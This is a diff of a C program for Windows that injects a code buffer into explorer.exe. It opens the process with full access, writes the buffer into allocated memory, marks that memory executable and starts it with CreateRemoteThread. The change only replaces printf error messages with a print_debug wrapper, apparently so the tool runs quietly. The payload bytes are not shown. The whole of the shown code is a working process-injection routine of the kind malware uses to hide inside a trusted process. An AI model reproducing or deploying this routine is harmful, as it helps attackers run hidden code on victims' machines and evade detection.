@@ -35,34 +35,34 @@ int main()
 
 	dwTgtProcId = FindProcessByName(TEXT("explorer.exe"));
 	if (dwTgtProcId == 0) {
-		printf("[-] target process not found\n");
+		print_debug("[-] target process not found\n");
 		return 0;
 	}
 	print_debug("[+] pid: %d\n", dwTgtProcId);
 
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTgtProcId);
 	if (hProcess == NULL) {
-		printf("[-] handle not obtained\n");
+		print_debug("[-] handle not obtained\n");
 		goto Exit;
 	}
 	print_debug("[+] handle obtained\n");
 
 	pRemoteAddr = VirtualAllocEx(hProcess, NULL, bufLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (pRemoteAddr == NULL) {
-		printf("[-] VirtualAllocEx failed (%d)\n", GetLastError());
+		print_debug("[-] VirtualAllocEx failed (%d)\n", GetLastError());
 		goto Exit;
 	}
 	print_debug("[+] remote memory allocation succeded: %p\n", pRemoteAddr);
 
 	if (!WriteProcessMemory(hProcess, pRemoteAddr, buf, bufLen, &bytesWritten)) {
-		printf("[-] WriteProcessMemory failed\n");
+		print_debug("[-] WriteProcessMemory failed\n");
 		VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
 		goto Exit;
 	}
 	print_debug("[+] written %lld bytes\n", bytesWritten);
 
 	if (!VirtualProtectEx(hProcess, pRemoteAddr, bufLen, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-		printf("[-] VirtualProtectEx failed\n");
+		print_debug("[-] VirtualProtectEx failed\n");
 		VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
 		goto Exit;
 	}
@@ -70,12 +70,12 @@ int main()
 
 	hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
 	if (hRemoteThread == NULL) {
-		printf("[-] CreateRemoteThread failed\n");
+		print_debug("[-] CreateRemoteThread failed\n");
 		VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
 		goto Exit;
 	};
 	if (hRemoteThread == NULL) {
-		printf("[-] handle on remote thread not obtained\n");
+		print_debug("[-] handle on remote thread not obtained\n");
 		VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
 		goto Exit;
 	}
